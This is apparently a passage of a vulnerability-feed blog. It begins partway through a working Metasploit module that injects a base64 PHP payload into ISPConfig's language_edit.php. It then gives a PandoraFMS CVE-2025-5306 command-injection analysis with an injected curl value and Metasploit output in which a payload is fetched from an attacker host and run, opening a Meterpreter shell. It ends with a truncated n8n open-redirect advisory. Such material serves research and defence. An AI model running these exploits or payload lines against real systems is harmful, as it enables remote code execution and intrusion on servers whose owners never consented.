class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res&amp;.code == <span class="hljs-number">302</span><br>      res = send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>         <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login/&#x27;</span>,res&amp;.headers.fetch(<span class="hljs-string">&#x27;Location&#x27;</span>,nil))<br>      &#125;)<br>    end<br>    <span class="hljs-keyword">if</span> res.body.match(<span class="hljs-regexp">/Username or Password wrong/i</span>)<br>      fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login failed: Invalid credentials&#x27;</span>)<br>    end<br>    <span class="hljs-keyword">if</span> res.headers.fetch(<span class="hljs-string">&#x27;Location&#x27;</span>,nil)&amp;.include?(<span class="hljs-string">&#x27;admin&#x27;</span>) ||<br>       res.body.downcase.include?(<span class="hljs-string">&#x27;dashboard&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Login successful!&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    end<br>    print_warning(<span class="hljs-string">&#x27;Login status unclear, attempting to continue...&#x27;</span>)<br>    <span class="hljs-literal">true</span><br>  end<br><br>  def inject_payload<br>    print_status(<span class="hljs-string">&#x27;Injecting PHP payload...&#x27;</span>)<br>    @payload_file = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;Rex::Text.rand_text_alpha_lower(<span class="hljs-number">8</span>)&#125;</span>.php&quot;</span><br>    injection = %&lt;<span class="hljs-string">&#x27;];file_put_contents(&#x27;</span><span class="hljs-comment">#&#123;@payload_file&#125;&#x27;,base64_decode(&#x27;#&#123;Base64.strict_encode64(payload.encoded)&#125;&#x27;);die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Unable to access language_edit.php&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    doc = res.get_html_document<br>    csrf_id = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_id&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    csrf_key = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_key&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <span class="hljs-keyword">unless</span> csrf_id &amp;&amp; csrf_key<br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;CSRF tokens not found!&#x27;</span>)<br>    end<br>    print_good(<span class="hljs-string">&quot;Extracted CSRF tokens: ID=<span class="hljs-subst">#&#123;csrf_id[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>..., KEY=<span class="hljs-subst">#&#123;csrf_key[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>...&quot;</span>)<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Injection request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    payload_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, @payload_file)<br>    print_good(<span class="hljs-string">&quot;Payload successfully injected: <span class="hljs-subst">#&#123;@payload_file&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload_url<br>  end<br><br>  def trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Triggering PHP payload...&#x27;</span>)<br>    <span class="hljs-comment"># Small delay to ensure the file is written</span><br>    sleep(<span class="hljs-number">1</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; payload_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">if</span> res&amp;.code == <span class="hljs-number">200</span><br>      print_good(<span class="hljs-string">&#x27;PHP payload triggered successfully&#x27;</span>)<br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Payload trigger response was unexpected&#x27;</span>)<br>    end<br>  end<br><br>  def cleanup<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> @payload_file<br>    print_status(<span class="hljs-string">&#x27;Cleaning up payload file...&#x27;</span>)<br>    <span class="hljs-comment"># Use the same vulnerability to delete the file</span><br>    injection = <span class="hljs-string">&quot;&#x27;];unlink(&#x27;<span class="hljs-subst">#&#123;@payload_file&#125;</span>&#x27;);die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> res<br>    doc = res.get_html_document<br>    csrf_id = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_id&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    csrf_key = doc.at(<span class="hljs-string">&#x27;input[name=&quot;_csrf_key&quot;]&#x27;</span>)&amp;.[](<span class="hljs-string">&#x27;value&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> csrf_id &amp;&amp; csrf_key<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    print_good(<span class="hljs-string">&quot;Payload file <span class="hljs-subst">#&#123;@payload_file&#125;</span> cleaned up&quot;</span>)<br>  end<br><br>  def exploit<br>    authenticate<br>    payload_url = inject_payload<br>    print_status(<span class="hljs-string">&#x27;Starting payload handler...&#x27;</span>)<br>    trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Manual trigger information:&#x27;</span>)<br>    print_line(<span class="hljs-string">&quot;URL: <span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&quot;</span>)<br>    print_line(<span class="hljs-string">&quot;Manual trigger: curl &#x27;<span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&#x27;&quot;</span>)<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ISPConfig language_edit.php PHP代码注入&lt;/p&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2025-5306</title>
    <link href="http://example.com/2025/06/27/other_1063151679/"/>
    <id>http://example.com/2025/06/27/other_1063151679/</id>
    <published>2025-06-27T14:30:09.323Z</published>
    <updated>2025-06-27T14:30:09.317Z</updated>
    
    <content type="html"><![CDATA[<p><strong>描述：</strong> Improper Neutralization of Special Elements in the Netflow directory field may allow OS command injection. This issue affects Pandora FMS 774 through 778</p><hr><p>In June 2025, PandoraFMS released a fix for the LTS version, which addresses a recent vulnerability, CVE-2025-5306, authenticated command injection in Netflow functionality. The exploitation requires <strong>Netflow to be enabled</strong> and also installed on the target machine. If these conditions are fulfilled, the attacker can reach remote code execution. Note that this affects PandoraFMS 777 LTS, not the latest version of PandoraFMS.</p><h2 id="Technical-Analysis"><a href="#Technical-Analysis" class="headerlink" title="Technical Analysis"></a>Technical Analysis</h2><p>PandoraFMS offers multiple modules that can be turned on or off with an administrative account. One of them is Netflow, which is responsible for real-time network monitoring. It can collect network data and then report or dump it. Once Netflow is configured, it allows you to perform various tasks, such as viewing and exporting network data. </p><p>The Netflow explorer contains a vulnerability when an unsanitized parameter from the Netflow configuration is placed into a string that gets executed using the exec() function. The vulnerable part is here (include&#x2F;functions_netflow.php): </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php">--- SNIPPED ---<br>    <span class="hljs-comment">// Execute nfdump.</span><br>    <span class="hljs-variable">$order_text</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$order</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;flows&#x27;</span>:<br>            <span class="hljs-variable">$order_text</span> = <span class="hljs-string">&#x27;flows&#x27;</span>;<br>        <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pkts&#x27;</span>:<br>            <span class="hljs-variable">$order_text</span> = <span class="hljs-string">&#x27;packets&#x27;</span>;<br>        <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;bytes&#x27;</span>:<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-variable">$order_text</span> = <span class="hljs-string">&#x27;bytes&#x27;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$options</span> = <span class="hljs-string">&quot;-q -o csv -n <span class="hljs-subst">$max</span> -s <span class="hljs-subst">$sort</span>/<span class="hljs-subst">$order_text</span> -t &quot;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$nfdump_date_format</span>, <span class="hljs-variable">$start_date</span>).<span class="hljs-string">&#x27;-&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$nfdump_date_format</span>, <span class="hljs-variable">$end_date</span>);<br>    <span class="hljs-variable">$command</span> = <span class="hljs-title function_ invoke__">netflow_get_command</span>(<span class="hljs-variable">$options</span>, <span class="hljs-variable">$netflow_filter</span>, <span class="hljs-variable">$start_date</span>, <span class="hljs-variable">$end_date</span>);<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$command</span>, <span class="hljs-variable">$result</span>);<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$result</span>)) &#123;<br>        <span class="hljs-keyword">return</span> [];<br>    &#125;<br>--- SNIPPED ---<br></code></pre></td></tr></table></figure><p>The function <code>netflow_get_command</code> generates the command string that is executed based on parameters configured by the user. Among them is <code>netflow_name_dir</code> (Data storage path), which is unsanitized and placed into the command. An attacker can set this parameter to an arbitrary OS command.</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-string">&#x27;netflow_name_dir&#x27;</span> =&gt; <span class="hljs-string">&#x27;;curl<span class="hljs-subst">$&#123;IFS&#125;</span>http://192.168.168.145:8081/;&#x27;</span>,<br></code></pre></td></tr></table></figure><p>In the example above, the injected command is curl <a href="http://192.168.168.145:8081/">http://192.168.168.145:8081/</a>. PandoraFMS stores the command as part of the Netflow configuration, but it is not executed when the configuration is saved. Upon visiting the Netflow explorer, the command is executed on the target machine, and we can see the connection attempt on the attacker’s machine, indicating that the exploitation was successful. We can then run any OS command. </p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>The exploitation has two conditions that must be met: an attacker must have admin access to PandoraFMS, and one of the Netflow binaries (nfcapd, nfexpire, etc.) must be present on the system. An attacker can enable Netflow. However, the exploitation technique also requires binaries such as nfcapd and nfexpire to be present as PandoraFMS checks the version of binaries specified by the Netflow configuration. While researching this vulnerability, no binary was found that would offer a suitable replacement on a standard Linux distribution. Custom or arbitrary binaries cannot be used because PandoraFMS checks if the binary is executable and if it returns <code>Version: X.XX</code> when run with the -V parameter.  If those conditions are met, then the attacker can run arbitrary OS commands, which can lead to remote access. The typical service account is www-data, so it is unlikely to receive a root shell from exploiting this vulnerability. The relevant code is shown below: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">netflow_print_check_version_error</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$config</span>;<br><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-title function_ invoke__">netflow_check_nfdump_binary</span>(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;netflow_nfdump&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-title function_ invoke__">ui_print_error_message</span>(<br>                <span class="hljs-title function_ invoke__">__</span>(<span class="hljs-string">&#x27;nfdump binary (%s) not found!&#x27;</span>, <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;netflow_nfdump&#x27;</span>])<br>            );<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-title function_ invoke__">ui_print_error_message</span>(<br>                <span class="hljs-title function_ invoke__">__</span>(<span class="hljs-string">&#x27;Make sure nfdump version 1.6.8 or newer is installed!&#x27;</span>)<br>            );<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">netflow_check_nfdump_binary</span>(<span class="hljs-params"><span class="hljs-variable">$nfdump_binary</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// Check that the binary exists and is executable.</span><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">is_executable</span>(<span class="hljs-variable">$nfdump_binary</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Check at least version 1.6.8.</span><br>    <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$rc</span> = -<span class="hljs-number">1</span>;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$nfdump_binary</span>.<span class="hljs-string">&#x27; -V&#x27;</span>, <span class="hljs-variable">$output</span>, <span class="hljs-variable">$rc</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$rc</span> != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$matches</span> = [];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$output</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$line</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/Version:[^\d]+(\d+)\.(\d+)\.(\d+)/&#x27;</span>, <span class="hljs-variable">$line</span>, <span class="hljs-variable">$matches</span>) === <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">int</span>) <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">1</span><br>                || ((<span class="hljs-keyword">int</span>) <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>] === <span class="hljs-number">1</span> &amp;&amp; (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$matches</span>[<span class="hljs-number">2</span>] &lt; <span class="hljs-number">6</span>)<br>                || ((<span class="hljs-keyword">int</span>) <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>] === <span class="hljs-number">1</span> &amp;&amp; (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$matches</span>[<span class="hljs-number">2</span>] === <span class="hljs-number">6</span> &amp;&amp; (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$matches</span>[<span class="hljs-number">3</span>] &lt; <span class="hljs-number">8</span>)<br>            ) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IoC"><a href="#IoC" class="headerlink" title="IoC"></a>IoC</h2><p>If the attacker injects a command, it might lead to failure to export&#x2F;view Netflow data. This might serve as an indicator of compromise. Additionally, monitoring POST requests that contain arbitrary OS commands may reveal the exploitation of this vulnerability. </p><h2 id="Metasploit-Example"><a href="#Metasploit-Example" class="headerlink" title="Metasploit Example"></a>Metasploit Example</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">msf6 exploit(linux/http/pandora_fms_auth_netflow_rce) &gt;<span class="hljs-keyword">set</span> rhosts <span class="hljs-number">192.168</span><span class="hljs-number">.168</span><span class="hljs-number">.146</span><br>msf6 exploit(linux/http/pandora_fms_auth_netflow_rce) &gt; run <span class="hljs-keyword">verbose</span>=<span class="hljs-keyword">true</span> <br>[*] command <span class="hljs-keyword">to</span> run <span class="hljs-keyword">on</span> remote host: curl -so ./khZKmkFYijJ http://<span class="hljs-number">192.168</span><span class="hljs-number">.168</span><span class="hljs-number">.128</span>:<span class="hljs-number">8080</span>/M1We21fZKyvgtWK9IWStLA;chmod +x ./khZKmkFYijJ;./khZKmkFYijJ&amp;<br>[*] <span class="hljs-keyword">Fetch</span> <span class="hljs-keyword">handler</span> listening <span class="hljs-keyword">on</span> <span class="hljs-number">192.168</span><span class="hljs-number">.168</span><span class="hljs-number">.128</span>:<span class="hljs-number">8080</span><br>[*] HTTP <span class="hljs-keyword">server</span> started<br>[*] Adding resource /M1We21fZKyvgtWK9IWStLA<br>[*] Started <span class="hljs-keyword">reverse</span> TCP <span class="hljs-keyword">handler</span> <span class="hljs-keyword">on</span> <span class="hljs-number">192.168</span><span class="hljs-number">.168</span><span class="hljs-number">.128</span>:<span class="hljs-number">4444</span> <br>[*] <span class="hljs-number">192.168</span><span class="hljs-number">.168</span><span class="hljs-number">.146</span>:<span class="hljs-number">80</span> - Running automatic <span class="hljs-keyword">check</span> (&quot;set AutoCheck false&quot; <span class="hljs-keyword">to</span> <span class="hljs-keyword">disable</span>)<br>[*] <span class="hljs-number">192.168</span><span class="hljs-number">.168</span><span class="hljs-number">.146</span>:<span class="hljs-number">80</span> - <span class="hljs-keyword">Version</span> <span class="hljs-number">7.0</span><span class="hljs-number">.777</span> detected<br>[+] <span class="hljs-number">192.168</span><span class="hljs-number">.168</span><span class="hljs-number">.146</span>:<span class="hljs-number">80</span> - The target <span class="hljs-keyword">is</span> vulnerable. Vulnerable PandoraFMS <span class="hljs-keyword">version</span> <span class="hljs-number">7.0</span><span class="hljs-number">.777</span> detected<br>[*] Client <span class="hljs-number">192.168</span><span class="hljs-number">.168</span><span class="hljs-number">.146</span> requested /M1We21fZKyvgtWK9IWStLA<br>[*] Sending payload <span class="hljs-keyword">to</span> <span class="hljs-number">192.168</span><span class="hljs-number">.168</span><span class="hljs-number">.146</span> (curl/<span class="hljs-number">7.68</span><span class="hljs-number">.0</span>)<br>[*] Meterpreter <span class="hljs-keyword">session</span> <span class="hljs-number">2</span> opened (<span class="hljs-number">192.168</span><span class="hljs-number">.168</span><span class="hljs-number">.128</span>:<span class="hljs-number">4444</span> -&gt; <span class="hljs-number">192.168</span><span class="hljs-number">.168</span><span class="hljs-number">.146</span>:<span class="hljs-number">54980</span>) at <span class="hljs-number">2025</span><span class="hljs-number">-06</span><span class="hljs-number">-25</span> <span class="hljs-number">12</span>:<span class="hljs-number">27</span>:<span class="hljs-number">52</span> +<span class="hljs-number">0200</span><br><br>meterpreter &gt; sysinfo<br>Computer     : <span class="hljs-number">192.168</span><span class="hljs-number">.168</span><span class="hljs-number">.146</span><br>OS           : Ubuntu <span class="hljs-number">20.04</span> (Linux <span class="hljs-number">5.15</span><span class="hljs-number">.0</span><span class="hljs-number">-136</span>-generic)<br>Architecture : x64<br>BuildTuple   : x86_64-linux-musl<br>Meterpreter  : x64/linux<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;描述：&lt;/strong&gt; Improper Neutralization of Special Elements in the Netflow directory field may allow OS command injection. This issu</summary>
      
    
    
    
    <category term="其他" scheme="http://example.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="attackerkb.com" scheme="http://example.com/tags/attackerkb-com/"/>
    
  </entry>
  
  <entry>
    <title>n8n allows open redirects via the /signin endpoint</title>
    <link href="http://example.com/2025/06/27/github_2818764525/"/>
    <id>http://example.com/2025/06/27/github_2818764525/</id>
    <published>2025-06-27T14:30:05.997Z</published>
    <updated>2025-06-27T14:30:05.992Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-5vj6-wjr7-5v9f">https://github.com/advisories/GHSA-5vj6-wjr7-5v9f</a></p><p><strong>仓库 Star：</strong> 112641</p><p><strong>CVSS 评分：</strong> 4.6</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-5vj6-wjr7-5v9f">https://github.com/n8n-io/n8n/security/advisories/GHSA-5vj6-wjr7-5v9f</a></p></li><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49592">https://nvd.nist.gov/vuln/detail/CVE-2025-49592</a></p></li><li><p><a href="https://github.com/n8n-io/n8n/pull/16034">https://github.com/n8n-io/n8n/pull/16034</a></p></li><li><p><a href="https://github.com/n8n-io/n8n/commit/4865d1e360a0fe7b045e295b5e1a29daad12314e">https://github.com/n8n-io/n8n/commit/4865d1e360a0fe7b045e295b5e1a29daad12314e</a></p></li><li><p><a href="https://github.com/n8n-io/n8n/releases/tag/n8n%401.98.0">https://github.com/n8n-io/n8n/releases/tag/n8n%401.98.0</a></p></li><li><p><a href="https://github.com/advisories/GHSA-5vj6-wjr7-5v9f">https://github.com/advisories/GHSA-5vj6-wjr7-5v9f</a></p></li></ul><p><strong>描述：</strong></p><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><p>This is an Open Redirect (CWE-601) vulnerability in the login flow of n8n. Authenticated users can be redirected to untrusted, attacker-controlled domains after logging in, by crafting malicious URLs with a misleading redirect query parameter.</p><p>This may lead to:</p><ul><li>Phishing attacks by impersonating the n8n UI on lookalike domains (e.g., n8n.local.evil.com)</li><li>Credential or 2FA theft if users are tricked into re-entering sensitive information</li><li>Reputation risk due to the visual similarity between attacker-controlled domains and trusted ones</li></ul><p>The vulnerability affects anyone hosting n8n and exposing the <code>/signin</code> endpoint to users.</p><h3 id="Patches"><a href="#Patches" class="headerlink" title="Patches"></a>Patches</h3><p>The issue has been patched in <a href="https://github.com/n8n-io/n8n/releases/tag/n8n%401.98.0">1.98.0</a>.<br>All users should upgrade to this version or later.</p><p>The fix introduces strict origin validation for redirect URLs, ensuring only same-origin or relative paths are allowed after 